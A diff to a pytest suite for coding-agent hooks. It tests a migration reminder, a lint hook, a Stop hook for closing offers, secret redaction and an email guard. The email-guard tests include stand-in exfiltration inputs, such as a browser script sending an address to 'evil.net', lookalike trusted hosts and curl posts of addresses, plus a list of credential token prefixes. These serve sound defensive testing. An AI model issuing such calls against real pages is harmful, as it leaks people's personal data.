@@ -41,9 +41,9 @@ def base_env(**overrides):
     return env
 
 
-def run_hook(name, *, stdin="", cwd=None, env=None, scripts=HOOKS):
+def run_hook(name, *, stdin="", cwd=None, env=None, scripts=HOOKS, args=()):
     return subprocess.run(
-        ["bash", str(scripts / name)],
+        ["bash", str(scripts / name), *args],
         input=stdin,
         cwd=str(cwd) if cwd else None,
         env=env,
@@ -1027,6 +1027,50 @@ def test_nested_run_checks_match():
     assert "CLAUDE_CODE_CHILD_SESSION" in canon
 
 
+@pytest.mark.parametrize(
+    "lib, fn",
+    [
+        (HOOKS / "lib" / "reminder-common.sh", "reminder_is_nested_run"),
+        (WRITING_HOOKS / "lib" / "voice-common.sh", "voice_is_nested_run"),
+    ],
+)
+def test_an_argument_naming_the_variable_is_not_a_nested_run(lib, fn):
+    # macOS `ps e` prints arguments and environment as one string: a prompt that quotes the
+    # variable (`claude -p "... CLAUDE_CODE_CHILD_SESSION=1 ..."`) is not a nested run.
+    env = {k: v for k, v in os.environ.items() if k != "CLAUDE_CODE_CHILD_SESSION"}
+    sleeper = [sys.executable, "-c", "import time; time.sleep(60)"]
+    proc = subprocess.Popen(
+        [*sleeper, "why is CLAUDE_CODE_CHILD_SESSION=1 set?"], env=env
+    )
+    try:
+        r = subprocess.run(
+            ["bash", "-c", f'source "$1"; {fn}', "_", str(lib)],
+            env=base_env(CLAUDE_PID=str(proc.pid)),
+        )
+    finally:
+        proc.kill()
+        proc.wait()
+    assert r.returncode == 1
+
+
+def test_plan_reminder_falls_back_to_bsd_stat(tmp_path):
+    # BSD stat has no -c: the hook then asks it with -f %m. A fake stat pins that on Linux CI.
+    fakebin = tmp_path / "fakebin"
+    fakebin.mkdir()
+    stat = fakebin / "stat"
+    stat.write_text(
+        "#!/bin/bash\n"
+        '[ "$1" = -f ] && [ "$2" = %m ] || exit 1\n'
+        "python3 -c 'import os, sys; print(int(os.stat(sys.argv[1]).st_mtime))' \"$3\"\n"
+    )
+    stat.chmod(0o755)
+    _write_plan(tmp_path, age=200)
+    env, stdin = _plan_env(tmp_path)
+    env["PATH"] = f"{fakebin}{os.pathsep}{env['PATH']}"
+    r = run_hook("plan-reminder.sh", cwd=tmp_path, env=env, stdin=stdin)
+    assert "REMINDER:" in r.stdout
+
+
 # ── popover-reminder.sh (also exercises lib/reminder-common.sh) ──────────────────────
 def test_popover_reminder_fires_for_controller_filename(tmp_path):
     ctrl = tmp_path / "tooltip_controller.js"
@@ -1389,6 +1433,7 @@ def test_lint_on_edit_keeps_unused_imports_by_default(tmp_path):
     # fixes/formatting still apply, so `x=1` becomes `x = 1`.
     if not _ruff_on_path():
         pytest.skip("ruff not installed")
+    (tmp_path / "ruff.toml").write_text("")
     py = tmp_path / "snippet.py"
     py.write_text("import os\nx=1\n")
     r = run_hook(
@@ -1404,6 +1449,7 @@ def test_lint_on_edit_removes_unused_imports_when_override_empty(tmp_path):
     # DEV_HOOKS_RUFF_KEEP= (empty) restores full autofix, so F401 strips the import.
     if not _ruff_on_path():
         pytest.skip("ruff not installed")
+    (tmp_path / "ruff.toml").write_text("")
     py = tmp_path / "snippet.py"
     py.write_text("import os\nx = 1\n")
     r = run_hook(
@@ -1413,6 +1459,46 @@ def test_lint_on_edit_removes_unused_imports_when_override_empty(tmp_path):
     )
     assert r.returncode == 0
     assert "import os" not in py.read_text()
+
+
+def test_lint_on_edit_leaves_python_alone_without_a_ruff_config(tmp_path):
+    # A third-party script (no pyproject, no ruff.toml) must not be rewritten into ruff
+    # style by a ruff that merely happens to be on PATH.
+    if not _ruff_on_path():
+        pytest.skip("ruff not installed")
+    (tmp_path / ".git").mkdir()
+    (tmp_path / "pyproject.toml").write_text('[project]\nname = "x"\n')
+    py = tmp_path / "snippet.py"
+    py.write_text("x=1\n")
+    r = run_hook(
+        "lint-on-edit.sh", stdin=json.dumps({"tool_input": {"file_path": str(py)}})
+    )
+    assert r.returncode == 0
+    assert py.read_text() == "x=1\n"
+
+
+@pytest.mark.parametrize(
+    "config, text",
+    [
+        ("ruff.toml", ""),
+        (".ruff.toml", ""),
+        ("pyproject.toml", "[tool.ruff]\nline-length = 100\n"),
+        ("pyproject.toml", "[tool.ruff.lint]\nselect = ['E']\n"),
+    ],
+)
+def test_lint_on_edit_formats_python_under_a_ruff_config(tmp_path, config, text):
+    # The config may sit above the file, anywhere up to the repo root.
+    if not _ruff_on_path():
+        pytest.skip("ruff not installed")
+    (tmp_path / ".git").mkdir()
+    (tmp_path / config).write_text(text)
+    py = tmp_path / "pkg" / "snippet.py"
+    py.parent.mkdir()
+    py.write_text("x=1\n")
+    run_hook(
+        "lint-on-edit.sh", stdin=json.dumps({"tool_input": {"file_path": str(py)}})
+    )
+    assert py.read_text() == "x = 1\n"
 
 
 def _fake_bundle(tmp_path, body):
@@ -3202,7 +3288,8 @@ def test_verify_work_skips_herb_when_not_bundled(tmp_path):
 
 
 requires_timeout = pytest.mark.skipif(
-    shutil.which("timeout") is None, reason="needs coreutils `timeout`"
+    not any(shutil.which(tool) for tool in ("timeout", "gtimeout", "perl")),
+    reason="needs coreutils `timeout`, `gtimeout` or perl",
 )
 
 
@@ -3740,6 +3827,96 @@ def test_migration_silent_for_migrations_init(tmp_path):
 
 def test_migration_silent_for_ordinary_model(tmp_path):
     r = _migration_run(tmp_path, "app/models/user.rb", session="g5")
+    assert r.returncode == 0
+    assert r.stdout.strip() == ""
+
+
+# ── migration-safety-reminder.sh prompt (UserPromptSubmit) ──────────────────────────
+def _migration_prompt_run(tmp_path, prompt, session="mp", **env):
+    payload = {"prompt": prompt, "cwd": "/x/y", "session_id": session}
+    return run_hook(
+        "migration-safety-reminder.sh",
+        args=("prompt",),
+        stdin=json.dumps(payload),
+        env=base_env(TMPDIR=str(tmp_path), DEV_HOOKS_FIRE_LOG=None, **env),
+    )
+
+
+@pytest.mark.parametrize(
+    "prompt",
+    [
+        "Add a nullable archived_at column to the searches table",
+        'Add a "status" column to the users table',
+        "add `archived_at` column to searches",
+        "add an archived_at:datetime column to searches",
+        "add a page_count column to books",
+        "rename the airtable_id column to external_id",
+        "make the name column not null",
+        "change the type of the price column",
+        "create a users table",
+        "create table audit_logs with actor and action",
+        "can you write a Prisma migration for the new feedback model?",
+        "We need a database migration that splits name into first and last",
+        "write a migration that drops the legacy_id column",
+        "migrate the database to add archived_at",
+        "Drop the old index on candidates and rename the table",
+        "Backfill the hired_at column for every existing placement",
+        "this needs a schema change: status becomes an enum",
+        "please ALTER TABLE jobs so owner_id is not null",
+    ],
+)
+def test_migration_prompt_fires_on_a_typed_schema_change(tmp_path, prompt):
+    r = _migration_prompt_run(tmp_path, prompt)
+    assert r.returncode == 0
+    out = assert_json_with(r.stdout, "before you write code")
+    assert out["hookSpecificOutput"]["hookEventName"] == "UserPromptSubmit"
+    assert "Reversible" in r.stdout
+
+
+@pytest.mark.parametrize(
+    "prompt",
+    [
+        # "migration" alone is a project name in some repos, not a schema change.
+        "What is left on the Artemis to Minerva migration this week?",
+        "Add a column to the comparison table in the README",
+        "add an index page for the docs",
+        "remove the table of contents from the report",
+        "Can you rename the Stop hook and update its tests?",
+        "write the migration status update for the team",
+        "add tests for the table component",
+        "rename the table header in the React component",
+        "add a column to the kanban board",
+        "Add the candidates table to the sidebar nav",
+        "make a table of the results per year",
+        "create index.ts",
+        "add an index signature to this type",
+        "add a constraint to the layout",
+        "backfill the missing tests",
+        "Update the JSON schema change log",
+        "schema migration for zod",
+        "<task-notification>\n<summary>add a column to the users table</summary>\n</task-notification>",
+        'review this: <pasted_content id="p1">ALTER TABLE jobs ADD COLUMN x</pasted_content id="p1">',
+    ],
+)
+def test_migration_prompt_silent_without_a_typed_schema_change(tmp_path, prompt):
+    r = _migration_prompt_run(tmp_path, prompt)
+    assert r.returncode == 0
+    assert r.stdout.strip() == ""
+
+
+def test_migration_prompt_fires_once_and_leaves_the_write_check_armed(tmp_path):
+    prompt = "Add a nullable archived_at column to the searches table"
+    assert _migration_prompt_run(tmp_path, prompt, session="g6").stdout.strip() != ""
+    assert _migration_prompt_run(tmp_path, prompt, session="g6").stdout.strip() == ""
+    # The after-write check is the safety net: the prompt-time fire must not use it up.
+    r = _migration_run(tmp_path, "db/migrate/20240101_add_users.rb", session="g6")
+    assert_json_with(r.stdout, "You just wrote a database migration")
+
+
+def test_migration_prompt_silent_when_opted_out(tmp_path):
+    r = _migration_prompt_run(
+        tmp_path, "Backfill the hired_at column", DEV_HOOKS_MIGRATION="false"
+    )
     assert r.returncode == 0
     assert r.stdout.strip() == ""
 
@@ -4412,6 +4589,202 @@ def test_email_guard_silent_otherwise(tool, tool_input):
     assert _asked(_email_guard(tool, tool_input)) is None
 
 
+TRUSTED_HOSTS = "*.team-site.org, team-site.org, *-team-slug.vercel.app"
+TRUSTED_TOOLS = "mcp__crm__*, mcp__slack__send"
+TRUSTED = {
+    "DEV_HOOKS_EMAIL_TRUSTED_HOSTS": TRUSTED_HOSTS,
+    "DEV_HOOKS_EMAIL_TRUSTED_TOOLS": TRUSTED_TOOLS,
+}
+JO = "jo@friend-mail.com"
+BROWSER_BATCH = "mcp__Claude_Browser__browser_batch"
+_TYPE = {"name": "computer", "input": {"action": "type", "text": JO}}
+
+
+def _go(url, **more):
+    return {"name": "navigate", "input": {"url": url, **more}}
+
+
+def _typing_on(*urls, text=JO):
+    """A browser batch that opens each URL, then types an address."""
+    actions = [{"name": "navigate", "input": {"url": url}} for url in urls]
+    actions.append({"name": "computer", "input": {"action": "type", "text": text}})
+    return {"actions": actions}
+
+
+@pytest.mark.parametrize(
+    "tool,tool_input",
+    [
+        # A connector the person listed: it acts as them on a service that holds the address.
+        ("mcp__crm__createContact", {"name": "Jo", "emails": [JO]}),
+        ("mcp__CRM__search", {"query": JO}),
+        ("mcp__slack__send", {"text": f"Escalating to {JO}"}),
+        # A browser call whose every page is this machine or a trusted host.
+        (BROWSER_BATCH, _typing_on("http://127.0.0.1:8026/sign-in")),
+        (BROWSER_BATCH, _typing_on("localhost:3101")),
+        (BROWSER_BATCH, _typing_on("https://app.team-site.org/sign-in")),
+        (BROWSER_BATCH, _typing_on("https://APP.Team-Site.org:8443/sign-in")),
+        (
+            "mcp__claude-in-chrome__browser_batch",
+            _typing_on("https://app-git-my-branch-team-slug.vercel.app/x"),
+        ),
+        (
+            "mcp__Claude_Browser__navigate",
+            {"url": f"https://team-site.org/users?email={JO}"},
+        ),
+    ],
+)
+def test_email_guard_silent_on_connectors_and_trusted_pages(tool, tool_input):
+    assert _asked(_email_guard(tool, tool_input, **TRUSTED)) is None
+
+
+@pytest.mark.parametrize(
+    "tool",
+    [
+        # Not on the list; a listed name is matched whole, and `[` is no character class.
+        "mcp__terminal__run_in_terminal",
+        "mcp__crm2__createContact",
+        "mcp__slack__send_dm",
+        "mcp__x__y",
+    ],
+)
+def test_email_guard_asks_about_an_mcp_tool_not_listed(tool):
+    tools = TRUSTED_TOOLS + ", mcp__[a-z]__y"
+    r = _email_guard(tool, {"text": JO}, DEV_HOOKS_EMAIL_TRUSTED_TOOLS=tools)
+    assert _asked(r)
+
+
+@pytest.mark.parametrize(
+    "tool_input",
+    [
+        # No page named in the call: the guard can't tell where the typing lands.
+        _typing_on(),
+        # A trusted page beside one that isn't.
+        _typing_on("https://app.team-site.org/a", "https://forum.remote-site.org/b"),
+        # Hosts that only look trusted.
+        _typing_on("https://team-site.org.evil.net/a"),
+        _typing_on("https://evilteam-site.org/a"),
+        _typing_on("https://evil.net/team-site.org/"),
+        _typing_on("https://app.team-site.org@evil.net/"),
+        _typing_on("https://localhost.evil.net/"),
+        # A browser reads the backslash as a slash, so this page is evil.net.
+        _typing_on("https://evil.net\\@app.team-site.org/"),
+        _typing_on("javascript:fetch('//evil.net')"),
+        _typing_on("javascript://localhost/%0Afetch('//evil.net')"),
+        _typing_on("data://localhost/x"),
+        _typing_on("https://evil.net%2f.team-site.org/"),
+        _typing_on("https://evil.net/?next=https://app.team-site.org/"),
+        # A trusted remote host over plain http.
+        _typing_on("http://app.team-site.org/"),
+        # Typed before the trusted page opens, or into another tab.
+        {"actions": [_TYPE, _go("http://localhost:3000")]},
+        {
+            "actions": [
+                _go("http://localhost:3000", tabId="1"),
+                {"name": "computer", "input": {**_TYPE["input"], "tabId": "2"}},
+            ]
+        },
+        # A page named under another key, or as a list.
+        {
+            "actions": [
+                _go("http://localhost:3000"),
+                {"name": "open", "input": {"URL": "https://evil.net"}},
+                _TYPE,
+            ]
+        },
+        {
+            "actions": [
+                _go("http://localhost:3000"),
+                {"name": "open", "input": {"urls": ["https://evil.net"]}},
+                _TYPE,
+            ]
+        },
+        {
+            "actions": [
+                _go("http://localhost:3000"),
+                {"name": "open", "input": {"url": ["https://evil.net"]}},
+                _TYPE,
+            ]
+        },
+        # A "url" on a call that opens no page.
+        {"action": "type", "text": JO, "url": "http://localhost:3000"},
+        # A host named in the typed text is not the page.
+        _typing_on(text=f"{JO} https://team-site.org"),
+        # A page set by script rather than a navigate action.
+        {
+            "actions": [
+                {
+                    "name": "javascript_tool",
+                    "input": {"text": f"location = 'https://evil.net/?e={JO}'"},
+                }
+            ]
+        },
+    ],
+)
+def test_email_guard_asks_in_a_browser_off_trusted_pages(tool_input):
+    hosts = TRUSTED_HOSTS + ", [a-z]*.net"
+    r = _email_guard(BROWSER_BATCH, tool_input, DEV_HOOKS_EMAIL_TRUSTED_HOSTS=hosts)
+    assert _asked(r)
+
+
+def test_email_guard_asks_in_a_browser_about_a_remote_url():
+    tool_input = {"url": f"https://forum.remote-site.org/?email={JO}"}
+    assert _asked(_email_guard("mcp__claude-in-chrome__navigate", tool_input))
+
+
+def test_email_guard_trusts_no_remote_page_without_the_setting():
+    tool_input = _typing_on("https://app.team-site.org/")
+    assert _asked(_email_guard(BROWSER_BATCH, tool_input))
+
+
+SCRATCH = "/private/tmp/claude-501/-Users-jo-code/1c7267ce/scratchpad"
+
+
+@pytest.mark.parametrize(
+    "path,content,asks",
+    [
+        (f"{SCRATCH}/notes.py", f'OWNER = "{JO}"\n', False),
+        ("/tmp/claude-1000/x/scratchpad/rows.json", f'{{"owner": "{JO}"}}', False),
+        # Request code in a scratch file still asks: running it sends the address.
+        (f"{SCRATCH}/send.py", f'requests.post(U, json={{"e": "{JO}"}})', True),
+        (f"{SCRATCH}/send.sh", f'curl -d e={JO} "$1"', True),
+        (f"{SCRATCH}/issue.sh", f'gh issue comment 1 --body "cc {JO}"', True),
+        (f"{SCRATCH}/run.py", f'subprocess.run(["x", "{JO}"])', True),
+        # Only the session scratchpad, not any path with the word in it or leading out of it.
+        ("/repo/scratchpad/notes.py", f'OWNER = "{JO}"\n', True),
+        (f"{SCRATCH}/../../../../repo/settings.py", f'OWNER = "{JO}"\n', True),
+        ("/tmp/claude-x/../../repo/scratchpad/s.py", f'OWNER = "{JO}"\n', True),
+    ],
+)
+def test_email_guard_scratch_files_ask_only_with_request_code(path, content, asks):
+    r = _email_guard("Write", {"file_path": path, "content": content})
+    assert bool(_asked(r)) is asks
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # A Homebrew versioned formula's launchd file, and a Cloud SQL IAM database user.
+        "launchctl list | grep sh.brew.postgresql@15.plist; curl -sI https://x.org",
+        'psql "host=db.remote-site.org user=app-runner@proj-1.iam dbname=d" -c "select 1"',
+        # A Homebrew versioned formula's file and its log.
+        "curl -s https://api.github.com/repos/Homebrew/homebrew-core/contents/Formula/n/node@24.rb",
+        "curl -s https://formulae.brew.sh/api/formula/node@24.json",
+        "tail ~/Library/Logs/Homebrew/postgresql@15.log; curl -sI https://x.org",
+    ],
+)
+def test_email_guard_silent_on_versioned_files_and_iam_database_users(command):
+    assert _asked(_email_guard("Bash", {"command": command})) is None
+
+
+@pytest.mark.parametrize("suffix", [".plist", ".iam", ".rb", ".json", ".log"])
+def test_email_guard_counts_a_real_address_with_a_suffix_added(suffix):
+    command = f"curl https://x.org -d e={JO}{suffix}"
+    assert _asked(_email_guard("Bash", {"command": command}))
+    in_header = "curl --user-agent" + f" 'bot {JO}{suffix}' https://x.org"
+    r = _email_guard("Bash", {"command": in_header})
+    assert json.loads(r.stdout)["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
 @pytest.mark.parametrize(
     "command",
     [
@@ -4858,6 +5231,58 @@ def test_email_guard_still_asks_beside_a_sign_in(command):
 def test_email_guard_without_an_allowlist_asks_about_every_address():
     command = {"command": 'curl -d "c=bot@public-alias.org" https://example.org'}
     assert _asked(_email_guard("Bash", command, DEV_HOOKS_ALLOWED_EMAILS=None))
+
+
+PATTERN = "claude-test*@public-alias.org"
+PATTERN_MATCH = "claude-test-1@public-alias.org"
+
+
+@pytest.mark.parametrize(
+    ("address", "asks"),
+    [
+        ("claude-test@public-alias.org", False),
+        ("Claude-Test-Admin@public-alias.org", False),
+        ("sam@public-alias.org", True),
+        ("my-claude-test@public-alias.org", True),
+        ("claude-test@public-alias.org.evil.org", True),
+        ("claude-test@evil.org", True),
+        # Case folds no further than lower().
+        ("claude-teſt@public-alias.org", True),
+    ],
+)
+def test_email_guard_allowlist_takes_a_star_pattern(address, asks):
+    command = {"command": f"curl -d 'email={address}' https://x.org"}
+    r = _email_guard("Bash", command, DEV_HOOKS_ALLOWED_EMAILS=PATTERN)
+    assert bool(_asked(r)) is asks
+
+
+def test_email_guard_blocks_a_pattern_allowed_address_in_a_user_agent():
+    in_header = "curl --user-agent" + f" 'bot {PATTERN_MATCH}' https://x.org"
+    r = _email_guard("Bash", {"command": in_header}, DEV_HOOKS_ALLOWED_EMAILS=PATTERN)
+    assert json.loads(r.stdout)["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
+@pytest.mark.parametrize("allowed", [PATTERN, PATTERN_MATCH])
+@pytest.mark.parametrize(
+    ("tool", "tool_input"),
+    [
+        (
+            "Bash",
+            {"command": f'C={PATTERN_MATCH}; curl --user-agent "bot $C" https://x.org'},
+        ),
+        (
+            "Write",
+            {
+                "file_path": "/srv/app/fetch.py",
+                "content": f"CONTACT = '{PATTERN_MATCH}'\nheaders = {{'User-Agent': f'x/1 ({{CONTACT}})'}}\n",
+            },
+        ),
+    ],
+)
+def test_email_guard_allowlist_is_off_in_a_call_that_sets_a_header(
+    tool, tool_input, allowed
+):
+    assert _asked(_email_guard(tool, tool_input, DEV_HOOKS_ALLOWED_EMAILS=allowed))
 
 
 def _denied(r):
@@ -6366,6 +6791,166 @@ def test_end_report_footers_match():
     assert mod == _canon_footer()
 
 
+# ── closing-offer-reminder.sh (Stop) ─────────────────────────────────────────────────
+def _closing_offer(tmp_path, last, *, lines=None, active=False, **env):
+    transcript = tmp_path / "t.jsonl"
+    lines = _turn(["Read"]) if lines is None else lines
+    transcript.write_text("\n".join(json.dumps(x) for x in lines) + "\n")
+    payload = {"transcript_path": str(transcript), "session_id": "co"}
+    if last is not None:
+        payload["last_assistant_message"] = last
+    if active:
+        payload["stop_hook_active"] = True
+    overrides = {"CLAUDE_CODE_ENTRYPOINT": None, "DEV_HOOKS_ORCHESTRATED": None}
+    overrides.update(env)
+    return run_hook(
+        "closing-offer-reminder.sh",
+        stdin=json.dumps(payload),
+        env=base_env(**overrides),
+    )
+
+
+@pytest.mark.parametrize(
+    "closing",
+    [
+        "Want me to add the same check to the other two callers?",
+        "Do you want me to write the tests as well?",
+        "Should I also update the README?",
+        "Shall I refactor the helper while I'm here?",
+        "Would you like me to run the full suite?",
+        "Let me know if you want the dark-mode variant too.",
+        "Let me know if you'd like me to wire it into the CLI.",
+        "Next steps could be adding a cache and a retry.",
+        "If you'd like, I can also add a dry-run flag.",
+        "Happy to add the fixtures if you want.",
+        "**Want me to** fix the remaining lint warnings?",
+    ],
+)
+def test_closing_offer_fires_on_an_offer_of_undone_work(tmp_path, closing):
+    r = _closing_offer(tmp_path, f"I fixed the parser.\n\n{closing}")
+    assert stop_blocked(r), closing
+    reason = _reason(r)
+    assert reason.startswith("[closing-offer]")
+    assert closing in reason
+    assert "which rule stops you" in reason
+
+
+def test_closing_offer_reads_the_your_move_ask_at_the_top(tmp_path):
+    last = (
+        "**Your move:** Want me to port the other three hooks too?\n"
+        "**Changed:** one hook.\n\nDetails (skippable)\n"
+        + "\n".join(f"- detail {i}" for i in range(12))
+    )
+    assert stop_blocked(_closing_offer(tmp_path, last))
+
+
+def test_closing_offer_falls_back_to_the_transcript(tmp_path):
+    lines = _turn(["Edit"]) + [_said("Done.\n\nWant me to add tests?")]
+    assert stop_blocked(_closing_offer(tmp_path, None, lines=lines))
+    # An earlier turn's offer is not this turn's last message.
+    lines += _turn(["Edit"], prompt="yes") + [_said("Added the tests.")]
+    assert _closing_offer(tmp_path, None, lines=lines).stdout.strip() == ""
+
+
+def test_closing_offer_blocks_once_per_natural_stop(tmp_path):
+    last = "Fixed.\n\nWant me to also fix the other callers?"
+    assert stop_blocked(_closing_offer(tmp_path, last))
+    # The reply that block forced is not checked again, so it can't loop.
+    assert _closing_offer(tmp_path, last, active=True).stdout.strip() == ""
+    assert _closing_offer(tmp_path, last, active=True).stdout.strip() == ""
+    # The next natural stop re-arms it.
+    assert stop_blocked(_closing_offer(tmp_path, last))
+
+
+def test_closing_offer_checks_another_hooks_forced_reply_once(tmp_path):
+    # Another Stop hook blocked a clean message; the rewritten reply ends on an offer.
+    assert _closing_offer(tmp_path, "Fixed the parser.").stdout.strip() == ""
+    last = "Reviewed.\n\nWant me to also fix the other callers?"
+    assert stop_blocked(_closing_offer(tmp_path, last, active=True))
+    assert _closing_offer(tmp_path, last, active=True).stdout.strip() == ""
+
+
+@pytest.mark.parametrize(
+    "last",
+    [
+        "Should I add tests for this?",
+        "I can also add a dry-run flag if you'd like.",
+        "Tell me if you'd like the tests added.",
+        "Would you prefer I refactor the helper first?",
+        "**Next steps:**\n- add a cache",
+        # The ask sits above the skippable details, or under a bare label or heading.
+        "Fixed.\n\nWant me to add tests?\n\nDetails (skippable)\n"
+        + "\n".join(f"- detail {i}" for i in range(8)),
+        "## Your move\n\nWant me to add tests?\n\n" + "\n".join("x" * 6),
+        "- **Your move:** Want me to add tests?\n\n" + "\n".join("x" * 6),
+        # A rule named far above the close is about something else.
+        "The old schema change was not reversible, so I rewrote it.\n\n"
+        + "\n".join(f"Line {i}." for i in range(6))
+        + "\nWant me to add tests?",
+    ],
+)
+def test_closing_offer_fires_on_other_shapes_of_offer(tmp_path, last):
+    assert stop_blocked(_closing_offer(tmp_path, last)), last
+
+
+@pytest.mark.parametrize(
+    "last",
+    [
+        # The session-archive question.
+        "**Your move:** Archive this session?\n**Changed:** the hook.",
+        # One-way or outward-facing actions are the person's call.
+        "**Your move:** Merge the branch into main?\n**Recommend:** Yes.",
+        "All green.\n\nWant me to push the branch and open the PR?",
+        "**Your move:** Should I also send the summary to Brian?",
+        "Want me to deploy it to production?",
+        "Shall I delete the old backups?",
+        "Want me to message Sam about the schema change?",
+        "**Your move:** Should I also email the team?",
+        "Want me to run `git push origin main`?",
+        "Want me to drop the old table?",
+        # The one-way action is named in the ask's options, not on the question line.
+        "**Your move:** Want me to go ahead?\n1. Merge now — lands on main\n2. Wait",
+        "This cannot be reverted, so: want me to run it?",
+        "Want me to run it? It needs your 1Password sign in.",
+        # Not an offer.
+        "You said you did not want me to touch the fixtures, so I left them.",
+        "| Should I also add tests? | yes |",
+        # The message already names the rule that stopped it.
+        "The backfill writes to production, so I stopped.\n\nWant me to run it?",
+        "The migration can't be undone, so I left it.\n\nShould I also run it?",
+        "Let me know if you want it applied: that step needs your sign-in.",
+        # No offer at all.
+        "**Your move:** nothing.\n**Changed:** the parser handles empty input.",
+        "Which of the two layouts do you prefer?",
+        "Let me know if you hit any problems with it.",
+        # An offer the turn only quotes or shows as code.
+        'The hook matches "Want me to" in the closing lines.\n\nAll tests pass.',
+        "The copy now reads:\n\n```\nWant me to save this?\n```\n\nDone.",
+        "> Should I also update the docs?\n\nI did that as well.",
+        # Earlier in a long message, not the closing lines.
+        "I asked myself: should I also cover MultiEdit? Yes, so I did.\n\n"
+        + "\n".join(f"Line {i} of the report." for i in range(8)),
+    ],
+)
+def test_closing_offer_silent_on_a_legitimate_close(tmp_path, last):
+    assert _closing_offer(tmp_path, last).stdout.strip() == "", last
+
+
+def test_closing_offer_blocks_an_undoable_offer_beside_a_one_way_ask(tmp_path):
+    last = "Want me to add the tests?\n\n**Your move:** Merge the branch into main?"
+    assert stop_blocked(_closing_offer(tmp_path, last))
+
+
+def test_closing_offer_silent_when_opted_out(tmp_path):
+    last = "Fixed.\n\nWant me to also fix the other callers?"
+    r = _closing_offer(tmp_path, last, DEV_HOOKS_CLOSING_OFFER="false")
+    assert r.stdout.strip() == ""
+
+
+def test_closing_offer_silent_without_a_message(tmp_path):
+    assert _closing_offer(tmp_path, None).stdout.strip() == ""
+
+
 def _emit_stop(lib, fn, **env):
     overrides = {"CLAUDE_CODE_ENTRYPOINT": None, "DEV_HOOKS_ORCHESTRATED": None}
     overrides.update(env)
@@ -6650,6 +7235,8 @@ REDACT_CASES = [
     ("ghp_" + _FILL, "github classic"),
     ("github_pat_11ABCDEFG0" + _FILL + "ABCD", "github fine-grained"),
     ("sk-ant-api03-" + _FILL + "-_", "anthropic"),
+    ("sk-" + _FILL, "openai"),
+    ("sk-proj-" + _FILL, "openai project"),
     ("xoxb-111111111111-2222222222222-" + _FILL, "slack bot"),  # gitleaks:allow
     ("AKIAIOSFODNN7EXAMPLE", "aws access key id"),
     ("glpat-" + _FILL, "gitlab pat"),
